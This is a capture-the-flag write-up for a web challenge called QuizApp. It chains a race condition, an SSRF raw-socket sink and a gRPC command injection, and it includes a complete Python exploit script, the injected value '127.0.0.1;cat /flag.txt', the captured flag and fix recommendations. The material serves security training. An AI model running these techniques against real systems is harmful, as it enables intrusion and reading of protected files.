# QuizApp
---
## Challenge Info
- Name: QuizApp
- Category: Web
- Difficulty: Hard
- Points: 150
- Flag format: `VBD{...}`
- Instance used: `http://ctf.vulnbydefault.com:5484`

---

## TL;DR
Exploit chain is:
1. **Race condition** in `submit.php` to gain more than +10 points for a single question.
2. Reach **100+ score** to unlock profile image update path.
3. Abuse hidden `avatar_url` in `profile.php` for **SSRF with raw socket write** to internal service `127.0.0.1:50051`.
4. Speak HTTP/2 + gRPC manually and inject shell command into monitor service:
   - `ip = "127.0.0.1;cat /flag.txt"`
5. Server stores returned bytes as uploaded avatar; read `/uploads/<random>.jpg` and extract `VBD{...}`.

---

## Root Cause Analysis

### 1) Race condition in answer submission (`src/submit.php`)
- Code checks if question is already solved:
  - `SELECT COUNT(*) FROM solved_questions WHERE user_id = ? AND question_id = ?`
- If not solved, it sleeps (`usleep(200000)`), then evaluates answer and updates score.
- There is **no transaction / lock / unique constraint** to prevent concurrent requests from passing the same check.

Impact:
- Multiple parallel requests for the same question can all award points before solved state is consistently visible.

### 2) SSRF sink in profile update (`src/profile.php`)
- Hidden branch accepts `POST avatar_url`.
- Uses `parse_url()` + `fsockopen(host, port)` and writes raw data derived from URL path:
  - `$data = urldecode(substr($path, 2));`
  - `fwrite($fp, $data);`
- Reads response bytes and stores them as `.jpg` even for remote fetch (`$is_remote = true`).

Impact:
- Arbitrary internal TCP interaction (SSRF-like raw socket) and response exfiltration through uploaded file.

### 3) Internal command injection in monitor (`monitor/main.go`)
- gRPC endpoint `HealthCheck.CheckHealth` runs:
  - `cmdStr := fmt.Sprintf("ping -c 1 %s", ip)`
  - `exec.Command("sh", "-c", cmdStr)`

Impact:
- If attacker can reach this gRPC service, `ip` is command-injection primitive.

### 4) Service exposure / trust boundary issue
- Docker runs internal monitor on `:50051` and web app in same container/network.
- Web app can reach monitor via localhost.

Combined impact:
- Remote attacker â†’ web app SSRF raw socket â†’ internal gRPC call â†’ command injection â†’ read `/flag.txt`.

---

## Exploitation Steps (Manual)

1. Register/login a normal user.
2. Trigger many parallel POSTs to `/submit.php` for the same `question_id`, trying both options repeatedly.
3. Repeat until score reaches at least **100**.
4. POST to `/profile.php` with `avatar_url` containing percent-encoded HTTP/2 + gRPC request targeting:
   - `:path = /health.HealthCheck/CheckHealth`
   - protobuf field `ip = "127.0.0.1;cat /flag.txt"`
5. Open profile, get generated uploaded filename from `<img src="uploads/<name>.jpg">`.
6. Request `/uploads/<name>.jpg` and grep for `VBD{...}`.

---

## Automated PoC Usage

Exploit script file:
- `1. ctf/quizapp-web/exploit_quizapp.py`

Run:

```bash
python "1. ctf/quizapp-web/exploit_quizapp.py" --base "http://ctf.vulnbydefault.com:5484"
```

Expected output includes:
- score race progress
- uploaded avatar filename
- final flag line

---

## Full Exploit Script

```python
#!/usr/bin/env python3
import argparse
import concurrent.futures
import random
import re
import secrets
import string
import sys
import time
import urllib.parse

import requests

try:
    import h2.connection
except Exception:
    print("[!] Missing dependency: h2 (pip install h2)")
    sys.exit(1)


def rand_user(prefix="u"):
    return f"{prefix}_{''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))}"


def must(cond, msg):
    if not cond:
        raise RuntimeError(msg)


def parse_score(html):
    m = re.search(r'id="user-score">\s*(\d+)\s*<', html)
    return int(m.group(1)) if m else 0


def parse_question_and_options(html):
    q = re.search(r"submitAnswer\((\d+), '((?:\\'|[^'])*)'\)", html)
    if not q:
        return None, []
    qid = int(q.group(1))
    opts = re.findall(r"submitAnswer\(%d, '((?:\\'|[^'])*)'\)" % qid, html)
    opts = [o.replace("\\'", "'") for o in opts]
    opts = list(dict.fromkeys(opts))
    return qid, opts


def encode_varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def build_grpc_h2_payload(command_str):
    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    raw = bytearray(conn.data_to_send())

    headers = [
        (":method", "POST"),
        (":scheme", "http"),
        (":path", "/health.HealthCheck/CheckHealth"),
        (":authority", "127.0.0.1:50051"),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
    ]
    conn.send_headers(1, headers)

    msg = command_str.encode()
    proto = b"\x0a" + encode_varint(len(msg)) + msg
    grpc_body = b"\x00" + len(proto).to_bytes(4, "big") + proto

    conn.send_data(1, grpc_body, end_stream=True)
    raw.extend(conn.data_to_send())
    return bytes(raw)


def percent_encode_bytes(b):
    return "".join(f"%{x:02X}" for x in b)


def run(base):
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    username = rand_user("quiz")
    password = "P@ssw0rd!" + ''.join(random.choice(string.digits) for _ in range(3))

    print(f"[*] Target: {base}")
    print(f"[*] User: {username}")

    r = s.post(
        f"{base}/auth.php",
        data={"action": "register", "username": username, "password": password},
        allow_redirects=True,
        timeout=20,
    )
    r.raise_for_status()

    r = s.post(
        f"{base}/auth.php",
        data={"action": "login", "username": username, "password": password},
        allow_redirects=True,
        timeout=20,
    )
    r.raise_for_status()
    must("Quiz" in r.text or "current score" in r.text.lower(), "Login failed")
    print("[+] Logged in")

    score = 0
    for round_no in range(1, 8):
        page = s.get(f"{base}/index.php", timeout=20)
        page.raise_for_status()
        score = parse_score(page.text)
        qid, opts = parse_question_and_options(page.text)

        print(f"[*] Round {round_no}: score={score}, qid={qid}, opts={opts}")
        if score >= 100:
            break
        if not qid or len(opts) < 1:
            break

        burst = []
        for _ in range(50):
            burst.append(opts[0])
            if len(opts) > 1:
                burst.append(opts[1])

        def hit(ans):
            try:
                rr = s.post(
                    f"{base}/submit.php",
                    data={"question_id": str(qid), "answer": ans},
                    timeout=20,
                )
                return rr.text
            except Exception:
                return ""

        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
            results = list(ex.map(hit, burst))

        correct_count = sum('"status":"correct"' in x for x in results)
        print(f"[+] Burst done: correct={correct_count}/{len(results)}")
        time.sleep(1.0)

    page = s.get(f"{base}/index.php", timeout=20)
    page.raise_for_status()
    score = parse_score(page.text)
    print(f"[*] Final score after race: {score}")
    must(score >= 100, "Could not reach 100 points; rerun exploit")

    injected_ip = "127.0.0.1;cat /flag.txt"
    h2_payload = build_grpc_h2_payload(injected_ip)
    path_payload = "/x" + percent_encode_bytes(h2_payload)
    avatar_url = f"http://127.0.0.1:50051{path_payload}"

    print(f"[*] Sending SSRF to internal gRPC with injected ip: {injected_ip}")
    r = s.post(
        f"{base}/profile.php",
        data={"avatar_url": avatar_url},
        allow_redirects=True,
        timeout=30,
    )
    r.raise_for_status()

    prof = s.get(f"{base}/profile.php", timeout=20)
    prof.raise_for_status()

    m = re.search(r"uploads/([a-f0-9]{32}\.jpg)", prof.text)
    must(m is not None, "Could not find uploaded avatar filename")
    avatar_name = m.group(1)
    print(f"[+] Avatar file: {avatar_name}")

    blob = s.get(f"{base}/uploads/{avatar_name}", timeout=20).content
    text = blob.decode("latin1", errors="ignore")

    fm = re.search(r"VBD\{[^}]+\}", text)
    if fm:
        print(f"\n[FLAG] {fm.group(0)}")
        return

    print("[!] Flag not found directly in uploaded response.")
    print("[!] Response sample:")
    print(text[:1200])


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://ctf.vulnbydefault.com:5484")
    args = ap.parse_args()
    run(args.base.rstrip("/"))
```

---

## Flag

`VBD{grpc_with_g0ph3r_1s_b3st_8ce34e4dfe3390c372e49dbb61ad3242}`

---

## Fix Recommendations
1. **submit.php**: use DB transaction + unique constraint `(user_id, question_id)` and atomic score update.
2. **profile.php**: remove `avatar_url` remote fetch path (or strict allowlist + safe HTTP client).
3. **monitor/main.go**: never shell-expand user input; use direct command args or pure ICMP library.
4. Isolate internal services from web app egress where possible.

